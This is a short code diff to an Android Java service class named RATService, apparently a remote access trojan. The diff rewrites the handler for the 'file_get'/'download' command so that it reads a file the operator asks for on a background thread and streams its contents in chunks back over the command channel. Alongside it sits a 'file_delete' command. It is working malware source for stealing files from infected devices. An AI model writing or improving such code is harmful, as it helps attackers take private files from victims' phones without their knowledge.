@@ -1697,15 +1697,26 @@ public class RATService extends Service {
                 }
                 break;
 
-            case "file_get":
-            case "download":
-                if (fileModule != null) {
-                    String result = fileModule.getFile(args);
-                    sendCommand("FILE_GET|" + result);
-                } else {
-                    sendCommand("FILE_GET|ERROR: File module not available");
-                }
-                break;
+            // ════════════════════════════════════════════════════════════════════════
+ 
+case "file_get":
+case "download":
+    if (fileModule != null) {
+        // Run on a background thread so the reader loop isn't blocked.
+        final String filePath = args;
+        new Thread(() -> {
+            // ChunkSender lambda routes directly through sendCommand()
+            // which already handles thread-safety via PrintWriter.
+            boolean ok = fileModule.getFile(filePath,
+                    line -> sendCommand(line));
+            if (!ok) {
+                Log.e(TAG, "getFile failed for: " + filePath);
+            }
+        }, "FileGetThread").start();
+    } else {
+        sendCommand("FILES_ERR|{\"success\":false,\"error\":\"File module not available\"}");
+    }
+    break;
 
             case "file_delete":
             case "delete":
